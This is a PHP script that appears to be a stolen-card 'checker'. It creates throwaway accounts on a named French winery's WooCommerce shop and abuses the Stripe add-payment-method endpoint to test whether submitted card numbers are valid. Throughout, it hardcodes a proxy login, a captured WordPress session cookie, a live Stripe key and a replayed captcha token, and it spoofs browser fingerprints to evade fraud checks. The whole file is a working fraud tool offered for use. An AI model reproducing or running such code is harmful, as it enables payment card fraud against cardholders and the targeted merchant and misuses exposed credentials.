<?php
header('Content-Type: application/json');
error_reporting(0);

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] === 'GET') {
    extract($_GET);
}

if (empty($card)) {
    echo json_encode([
        'card' => '',
        'status' => 'ERROR',
        'response' => 'Missing card parameter. Use ?card=cc|mm|yy|cvv',
        'approved' => false,
        'gateway' => 'Stripe Auth',
        'time' => 0
    ]);
    exit;
}

$start_time = microtime(true);
$separa = explode('|', trim($card), 4);
if (count($separa) < 4) {
    echo json_encode([
        'card' => $card,
        'status' => 'ERROR',
        'response' => 'Invalid card format. Use cc|mm|yy|cvv',
        'approved' => false,
        'gateway' => 'Stripe Auth',
        'time' => round(microtime(true) - $start_time, 2)
    ]);
    exit;
}

$cc = preg_replace('/\s+/', '', $separa[0]);
$mm = trim($separa[1]);
$yy = substr(trim($separa[2]), -2);
$cvv = trim($separa[3]);

function build_cookie_str($cookies) {
    if (empty($cookies)) return '';
    $parts = [];
    foreach ($cookies as $k => $v) $parts[] = $k . '=' . $v;
    return implode('; ', $parts);
}

function curl_get($url, $headers = [], $cookies = []) {
    global $proxy_url;
    $ch = curl_init();
    $opts = [
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 60,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_MAXREDIRS => 5,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_HTTPHEADER => $headers,
        CURLOPT_COOKIE => build_cookie_str($cookies)
    ];
    if (!empty($proxy_url)) {
        $opts[CURLOPT_PROXY] = $proxy_url;
    }
    curl_setopt_array($ch, $opts);
    $res = curl_exec($ch);
    if (curl_errno($ch)) {
        $err = curl_error($ch);
        curl_close($ch);
        throw new Exception('CURL GET error: ' . $err . ' | URL: ' . substr($url, 0, 80));
    }
    curl_close($ch);
    return $res;
}

function curl_post($url, $data, $headers = [], $cookies = []) {
    global $proxy_url;
    $ch = curl_init();
    $opts = [
        CURLOPT_URL => $url,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => is_array($data) ? http_build_query($data) : $data,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 60,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_MAXREDIRS => 5,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_HTTPHEADER => $headers,
        CURLOPT_COOKIE => build_cookie_str($cookies)
    ];
    if (!empty($proxy_url)) {
        $opts[CURLOPT_PROXY] = $proxy_url;
    }
    curl_setopt_array($ch, $opts);
    $res = curl_exec($ch);
    if (curl_errno($ch)) {
        $err = curl_error($ch);
        curl_close($ch);
        throw new Exception('CURL POST error: ' . $err . ' | URL: ' . substr($url, 0, 80));
    }
    curl_close($ch);
    return $res;
}

function gen_rand($chars, $len) {
    $s = '';
    for ($i = 0; $i < $len; $i++) {
        $s .= $chars[random_int(0, strlen($chars) - 1)];
    }
    return $s;
}


$proxy_url = 'http://purevpn0s12456771:fc0bdh0p@px043005.pointtoserver.com:10780';

$ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36 Edg/145.0.0.0';

$cookies = [
    'pll_language' => 'fr',
    '__stripe_mid' => '18d5f230-d329-48fd-ac15-9490c1eab2f1f19f13',
    'sbjs_migrations' => '1418474375998%3D1',
    'sbjs_current_add' => 'fd%3D2026-02-19%2009%3A29%3A17%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.vignobledubreuil.com%2Fmon-compte%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_first_add' => 'fd%3D2026-02-19%2009%3A29%3A17%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.vignobledubreuil.com%2Fmon-compte%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_current' => 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_first' => 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_udata' => 'vst%3D2%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F145.0.0.0%20Safari%2F537.36%20Edg%2F145.0.0.0',
    'sbjs_session' => 'pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.vignobledubreuil.com%2Fmon-compte%2F',
    'wordpress_logged_in_81eadbbb09f5c6c7c9759b8c7a7433ff' => 'andrewmccrea1305%7C1772112439%7C7ybc23nzTv4unexS6rDcytfQS6tjNNfzrGx45KCwYWW%7C544f5f04bcbb77e36e874112c2122b7878b978df7016afa432305893955a0c95',
];

$headers = [
    'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
    'connection: keep-alive',
    'upgrade-insecure-requests: 1',
    'user-agent: ' . $ua,
];

try {
    $cookies_step1 = array_diff_key($cookies, ['wordpress_logged_in_81eadbbb09f5c6c7c9759b8c7a7433ff' => '']);
    $res = curl_get('https://www.vignobledubreuil.com/mon-compte/', $headers, $cookies_step1);
    if (!preg_match('/woocommerce-register-nonce" value="([^"]+)"/', $res, $m1) || !preg_match('/register" value="([^"]+)"/', $res, $m2)) {
        throw new Exception('Cannot get nonces');
    }
    $woocommerce_register_nonce = $m1[1];
    $register = $m2[1];

    $time = date('Y-m-d H:i:s');
    $random_email = gen_rand('abcdefghijklmnopqrstuvwxyz', 10) . '@gmail.com';
    $time_on_page = mt_rand(30000, 60000);
    $muid = sprintf('%s%s', bin2hex(random_bytes(16)), gen_rand('abcdefghijklmnopqrstuvwxyz0123456789', 6));
    $sid = sprintf('%s%s', bin2hex(random_bytes(16)), gen_rand('abcdefghijklmnopqrstuvwxyz0123456789', 6));
    $guid = sprintf('%s%s', bin2hex(random_bytes(16)), gen_rand('abcdefghijklmnopqrstuvwxyz0123456789', 6));

    $data_reg = [
        'email' => $random_email,
        'wc_order_attribution_source_type' => 'typein',
        'wc_order_attribution_referrer' => '(none)',
        'wc_order_attribution_utm_campaign' => '(none)',
        'wc_order_attribution_utm_source' => '(direct)',
        'wc_order_attribution_utm_medium' => '(none)',
        'wc_order_attribution_utm_content' => '(none)',
        'wc_order_attribution_utm_id' => '(none)',
        'wc_order_attribution_utm_term' => '(none)',
        'wc_order_attribution_utm_source_platform' => '(none)',
        'wc_order_attribution_utm_creative_format' => '(none)',
        'wc_order_attribution_utm_marketing_tactic' => '(none)',
        'wc_order_attribution_session_entry' => 'https://www.vignobledubreuil.com/',
        'wc_order_attribution_session_start_time' => $time,
        'wc_order_attribution_session_pages' => '4',
        'wc_order_attribution_session_count' => '1',
        'wc_order_attribution_user_agent' => $ua,
        'woocommerce-register-nonce' => $woocommerce_register_nonce,
        '_wp_http_referer' => '/mon-compte/',
        'register' => $register,
    ];
    curl_post('https://www.vignobledubreuil.com/mon-compte/', $data_reg, $headers, $cookies_step1);

    $cookies['__stripe_sid'] = 'd48d1146-9d5c-4d32-86c9-f50d0f6ef33bff7726';

    $res = curl_get('https://www.vignobledubreuil.com/mon-compte/ajouter-un-moyen-de-paiement/', $headers, $cookies);
    if (!preg_match('/"createAndConfirmSetupIntentNonce":"([^"]+)"/', $res, $m3)) {
        throw new Exception('Cannot get setup intent nonce');
    }
    $_ajax_nonce = $m3[1];

    $headers_stripe = [
        'accept: application/json',
        'origin: https://js.stripe.com',
        'referer: https://js.stripe.com/',
        'user-agent: ' . $ua,
    ];
    $url_stripe = 'https://api.stripe.com/v1/elements/sessions?deferred_intent[mode]=setup&deferred_intent[currency]=eur&deferred_intent[payment_method_types][0]=card&deferred_intent[setup_future_usage]=off_session&currency=eur&key=pk_live_51IL8NuFfFxWuzzINEoj39fwaUtlptPFsSmgq1KlsuA6NzIiWJ16LFIMqxDa3JGckNUeCpOCAJSMfWJ7sLBrgIREt00999pcRzZ&_stripe_version=2024-06-20&elements_init_source=stripe.elements&referrer_host=www.vignobledubreuil.com&stripe_js_id=22d496c0-7304-43b2-a46d-912b80d555a1&locale=fr&type=deferred_intent';
    $res = curl_get($url_stripe, $headers_stripe);
    $stripe_json = json_decode($res);
    if (!$stripe_json || empty($stripe_json->config_id)) {
        $debug = substr($res, 0, 300);
        $err_msg = $stripe_json->error->message ?? '';
        throw new Exception('Cannot get Stripe config: ' . ($err_msg ?: $debug));
    }
    $config_id = $stripe_json->config_id;

    $fingerprint_data = generate_fingerprint($muid, $sid, $guid);
    $cookies_m = 'm=71a8db09-afdd-4136-9f1a-10aab245224f1cfaf0; __Secure-LinkSessionPresent=true';
    $headers_m = [
        'accept: */*',
        'content-type: text/plain;charset=UTF-8',
        'origin: https://m.stripe.network',
        'referer: https://m.stripe.network/',
        'user-agent: ' . $ua,
    ];
    $ch = curl_init('https://m.stripe.com/6');
    curl_setopt_array($ch, [
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => $fingerprint_data . '=',
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_HTTPHEADER => $headers_m,
        CURLOPT_COOKIE => $cookies_m,
        CURLOPT_SSL_VERIFYPEER => false,
    ]);
    if (!empty($proxy_url)) {
        curl_setopt($ch, CURLOPT_PROXY, $proxy_url);
    }
    $res_m = curl_exec($ch);
    curl_close($ch);
    $m_json = json_decode($res_m);
    if (!$m_json) {
        throw new Exception('Cannot get Stripe muid/sid/guid');
    }
    $muid_new = $m_json->muid ?? $muid;
    $sid_new = $m_json->sid ?? $sid;
    $guid_new = $m_json->guid ?? $guid;

    $radar_token = 'P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwZCI6MCwiZXhwIjoxNzcwMDQ1NTM1LCJjZGF0YSI6IjFjbzR5dEV2WlIzWndIVlEyWlVldytIWFpobHFVZDR2bFFic09pK2NmTHpNWGZGWlVnaVluQXB0Kzl4cjlXMFptT3d4WjVOOS9xeGVHMEZiemgycm8yYXhkZHJhNzRoSmNqbHA1Z1BUbFhSU21vWFhTekpYenk3b0tUUVcvUjJoYkFuUUkxK0dGQ0dCRWFTUEJ6MVFYdDFYL0E2NE9nUDRRS2NuMklza3Fwd2tWSzdEM3JUNi9OdTlWNEd3Tk9PY3R1SUxqUFdxeEdCajBmQ1orcGpSL1lsb3lzOEE5cEUraWV3bWttZ21uczBUYyszN3FiY2pURlBPWjQza3BZSGxnQ3RIVmxrQjdmeXdFY2Z4cEphZk04ZHVXT2swa0xWWEEyY1NKaGZNellkR0svdzVKVW0remdJeEkwNTNTbGlsdHJzZzZsSDVTTDczQ0ZVQW9kcWpneDFqeUVmOHpQKy9kSmVIb1dmaW1oUT1IdGU4NE42ajdmL09XajdpIiwicGFzc2tleSI6IlFjejlLY0JUWXVSS1BjaVVpc0dyMmtjUVJNTnJoeFppK1M1b29ycWNOM3NBa201eDlhNXNnOWR1K0sybi9TZmVVaUxzSituY05WVjJHWmNUTmFQbWtQUTlQdEVQS2RwM25JMlNVRzNzTmZoL3JUU1ZHblFqdWdJbSt2OXh1N3VQc3NJWDRpcmtUd3JmZm1EN2N1OXl5c1JVSkpNUStYdTRJdFhXV2NOeStTWFljNW94OVp4Yzh2VzBMcHFzT2ZKRFlPeitscHpBYjB1c2tZMzduNXhLL2lwL1FOelNranlsSkRqMU1RcDV4RlFoVlBiSzl1UHdnTkwycjZTM2VVdWdVcDA3U2lCVFlGUVNMdDBFbTF1Qk5EbTdVM0JCOU1ibDZJR1lTYm1rVCtWT1RCOU0xdzhlU0g3ZzVQMnNtbWdSSDVHREt2Y0Z3dWVWOGFJZ3hoMVZBVVRQUmNRQXlJck5kTUdjSG45aG9rcnZLd3lwSWZzM0JIdUg2YXhQaHdHd3BpSy9ldjhzWDhOUlVGZEdrczg3SDhiR2FXWnBYZVZqUmJEM3lqQUFVeTNSMFU3YlBmNmN3NGJlWG5QN2FYOW1wcEQraFJFT3RZOUJWbDgzNFhxNW5RSU9UU0lQWHBGZi9FUkROSSs2SG1vS3JnNitUVGw5c1g0YmlJMnlIbjQ2WTJSRU82djlSYjkyTUtEQzF5WURKN1F5WUlIUFlPV2lFYTdKc3JRaHpsZE5mcDdYNGxFMHBhdkxzQlhhY05DR2Q4TFRtVjMyVmVRWUxQU2RRSnY0dFJpZlVKazRGZW51WHFERVAvK3RHQTdxeXNqbFQrV0ZRSWNzVXVxWkN0bjQ5RStLUjMxVWxvY1E4YUgzYkVkRHhSV3VoSGxwakxIWHM5cHRESjhrZHJtZkcydCtaM3Z4V1A5WWE5VmlnM2VjamUvd3c4cTNwWE4vbTl4djdhRkJ5TGUvVmZ0QW5hTmZjRG9OV2FKT292L1FBU2dMTFExd3ZPTmk0d1RYMEJRN1dEZXBKajFhbVVvL3VEbkZwcCt5MWxrUXZ5cklpYzNIeDFvVWZEbFdrTVJzc0tFS0xRNnd0Z2lQa2ZrdEtrVGdCYkphc24wRnRycVNEeGMwTnBUK3ZHUXowcFg3MU5VWDA1aHpHM2FJL1BXU0RMVDlhV2JxZjY2Z0ZQVEp4YnRmcHR3ZnBqamdnV3Voek9JRnpJOWh5OTlSZVY2WCtIZEYrNFFJUStFQVY3U2hlUXNYS2FNZmJuOTR2Ny9Xc2xHZlRQbzlJb3NFaTZZZkZ3Q3VWS01MTGR2b1RBdUZEVC80TFBaSHMraGxja1F6bUkwUWpKMlZ1Qmx6Tkw0N3I2VC85NHN2VDRYaHBqdmppak9uTEJQOURoVWNSMGg1bnlLay82aWlEMkhYK3ZVV3BWaU91em16Z1FJMWlBZU1jODFHeXRiSllJTkJHb2lYK0I2QUYreWxOVmhvQmpUU3R0K1ppVXpsbExCUU1aTFNKMXBLQnBuRkxRd0ZHZHNnRHF0VVpFaTJqK2cvUGprc2RWd2dhM0FyOHBhNUdpaDNXWWZOQldiTWZ0OXMxVjBJdXFTL2xMemZ3SGo4RUJDeitjTk5qOThkRk1oTUdENW1xeWgxSkJPU1hKazhHMGlVNkZkTTA2bWlpS2NTZFVBaE1JU2wrTXBEbGpnaWlNOGpRMHdLRHdsUXVRalVZZmNVMXhadlByK2dVSmNqLzNBWERueFh0dTVTOGNwb0F0aC95YWRVdDJKcldHLzZEL3pBTlVkeVdYaFZFMmlMbFVENXZjUE91ckN1R0RiUjd1WitSc1NLeGJDZjBKTnZ5QXdvdHRQMGlXM2dVcllibVptcGUrRmpQL2tHb0Q3MDRnaUp4RnRSUjNHK1Bad2RaWUlZMzZTOFc3dFdXSG5ZZmNrb0l6YlBLcVdYUzZOVHB3VEhjYzBHRFVwNlNLOVJ5VDJHemUzU1k0ZDJVUUxzZFlMSHAxSXd1b1pKQ0pwL1ovay9GRnNYMDQwTW1jdnJXemZQdXY4WVdibEFpUlNhK0l2TmxMWE5oQzRXUjhvMElvZXZQemtxM0ZyV0U4NUVUQlo0Y0FVWVFjUTBYZzRSd3ErUjQraE9LUG96b2U3Q2gwL1NMdWM5MXdjb0xNRHduaWQ3NWpMYVNneklJbTU2OEdmWGYxUlVSUkFYL2VodnhxOGhHQWlkU2pFbTVVMi9Jdi9Eam13cmRwLzF1MGZLbkFFUmxsdGpPSVJvWlp0SEpveEdISkhKS0w5cmJuc0xpZ0dxdnVTZG9mcFRtZzYxTlIweXhKSG5jTUhkMTZ4c29FUXkzdzBYMURVdnRaU3hGaWRkMFp2RFFMOWN3dy8rTURhaTZqWkVoVVJ1dG5HUnFrVW40ejN2bFYxQXo1RXBISEoweDl6NWRuWC9DaGpUZUlEY1JoNFQ0eHVFRTV4ZlVEUkFvSnNOSjA1RHY0NG1TNHhXUTFheHpBT0hjYjRmN2pXOHdETURxeFJDdCs5OVVtbnFwUWhQeDRuMHlhNzJjbkord0RHemJzd01qdjNYaE9QMDZnVmRKakRQMUR4L1NEQ0ZKZVBzRS9qKzFmQldpSWxIRlhvYnNjYittSXhSRkEzdmxtdGxvREV2RjVXanJKU0pua0l0YVJPMUN4YUxWZ1VjMkJsQi9GdHNHaWh6aGNQTWhxWWFyM0daZE0xSVpISnVVc2hxeFY4MTZobjNrOEk9Iiwia3IiOiIyOTI2ZDljMiIsInNoYXJkX2lkIjozNjI0MDY5OTZ9.fWzBpPGv1npSx5tvV47gmI5b_Xj7eVhC1x2LTeMblV4';

    $post_pm = 'type=card&card[number]=' . urlencode($cc) . '&card[cvc]=' . urlencode($cvv) . '&card[exp_year]=' . urlencode($yy) . '&card[exp_month]=' . urlencode($mm) .
        '&allow_redisplay=unspecified&billing_details[address][country]=FR&pasted_fields=number' .
        '&payment_user_agent=stripe.js%2Feeaff566a9%3B+stripe-js-v3%2Feeaff566a9%3B+payment-element%3B+deferred-intent' .
        '&referrer=https%3A%2F%2Fwww.vignobledubreuil.com&time_on_page=' . $time_on_page .
        '&client_attribution_metadata[client_session_id]=22d496c0-7304-43b2-a46d-912b80d555a1' .
        '&client_attribution_metadata[merchant_integration_source]=elements' .
        '&client_attribution_metadata[merchant_integration_subtype]=payment-element' .
        '&client_attribution_metadata[merchant_integration_version]=2021' .
        '&client_attribution_metadata[payment_intent_creation_flow]=deferred' .
        '&client_attribution_metadata[payment_method_selection_flow]=merchant_specified' .
        '&client_attribution_metadata[elements_session_config_id]=' . urlencode($config_id) .
        '&client_attribution_metadata[merchant_integration_additional_elements][0]=payment' .
        '&guid=' . urlencode($guid_new) . '&muid=' . urlencode($muid_new) . '&sid=' . urlencode($sid_new) .
        '&key=pk_live_51IL8NuFfFxWuzzINEoj39fwaUtlptPFsSmgq1KlsuA6NzIiWJ16LFIMqxDa3JGckNUeCpOCAJSMfWJ7sLBrgIREt00999pcRzZ' .
        '&_stripe_version=2024-06-20' .
        '&radar_options[hcaptcha_token]=' . urlencode($radar_token);

    $res_pm = curl_post('https://api.stripe.com/v1/payment_methods', $post_pm, array_merge($headers_stripe, ['content-type: application/x-www-form-urlencoded']), []);
    $pm_json = json_decode($res_pm);
    if (!$pm_json || empty($pm_json->id)) {
        $err = $pm_json->error->message ?? 'Cannot create payment method';
        throw new Exception($err);
    }
    $id_payment = $pm_json->id;

    $wp_login = 'andrewmccrea1305%7C1772112439%7C7ybc23nzTv4unexS6rDcytfQS6tjNNfzrGx45KCwYWW%7C544f5f04bcbb77e36e874112c2122b7878b978df7016afa432305893955a0c95';
    $cookies_final = array_merge($cookies, [
        'wordpress_sec_81eadbbb09f5c6c7c9759b8c7a7433ff' => $wp_login,
        'sbjs_session' => 'pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.vignobledubreuil.com%2Fmon-compte%2F',
    ]);

    $headers_final = [
        'accept: */*',
        'content-type: application/x-www-form-urlencoded; charset=UTF-8',
        'origin: https://www.vignobledubreuil.com',
        'referer: https://www.vignobledubreuil.com/mon-compte/ajouter-un-moyen-de-paiement/',
        'user-agent: ' . $ua,
        'x-requested-with: XMLHttpRequest',
    ];

    $data_confirm = [
        'action' => 'wc_stripe_create_and_confirm_setup_intent',
        'wc-stripe-payment-method' => $id_payment,
        'wc-stripe-payment-type' => 'card',
        '_ajax_nonce' => $_ajax_nonce,
    ];

    $res_final = curl_post('https://www.vignobledubreuil.com/wp-admin/admin-ajax.php', $data_confirm, $headers_final, $cookies_final);
    $resp_json = json_decode($res_final);

    $elapsed = round(microtime(true) - $start_time, 2);

    if ($resp_json && isset($resp_json->success)) {
        if ($resp_json->success === true) {
            $status_val = $resp_json->data->status ?? '';
            $response_msg = $resp_json->data->message ?? $resp_json->data->redirect_url ?? $status_val ?? '';
            if ($status_val === 'succeeded') {
                echo json_encode([
                    'card' => $card,
                    'status' => 'APPROVED',
                    'response' => $response_msg ?: 'Approved',
                    'approved' => true,
                    'gateway' => 'Stripe Auth',
                    'time' => $elapsed
                ]);
            } elseif ($status_val === 'requires_action') {
                echo json_encode([
                    'card' => $card,
                    'status' => '3DS',
                    'response' => $response_msg ?: '3DS Required',
                    'approved' => false,
                    'gateway' => 'Stripe Auth',
                    'time' => $elapsed
                ]);
            } else {
                echo json_encode([
                    'card' => $card,
                    'status' => 'DECLINED',
                    'response' => $response_msg ?: $status_val ?: 'Declined',
                    'approved' => false,
                    'gateway' => 'Stripe Auth',
                    'time' => $elapsed
                ]);
            }
        } else {
            $err_msg = $resp_json->data->error->message ?? 'Unknown error';
            $approved = (stripos($err_msg, 'declined') !== false) ? false : false;
            echo json_encode([
                'card' => $card,
                'status' => stripos($err_msg, 'declined') !== false ? 'DECLINED' : 'ERROR',
                'response' => $err_msg,
                'approved' => false,
                'gateway' => 'Stripe Auth',
                'time' => $elapsed
            ]);
        }
    } else {
        echo json_encode([
            'card' => $card,
            'status' => 'ERROR',
            'response' => 'Invalid response',
            'approved' => false,
            'gateway' => 'Stripe Auth',
            'time' => $elapsed
        ]);
    }

} catch (Exception $e) {
    $elapsed = round(microtime(true) - $start_time, 2);
    $msg = $e->getMessage();
    $is_declined = (stripos($msg, 'declined') !== false || stripos($msg, 'card') !== false && stripos($msg, 'invalid') !== false);
    echo json_encode([
        'card' => $card,
        'status' => $is_declined ? 'DECLINED' : 'ERROR',
        'response' => $msg,
        'approved' => false,
        'gateway' => 'Stripe Auth',
        'time' => $elapsed
    ]);
}
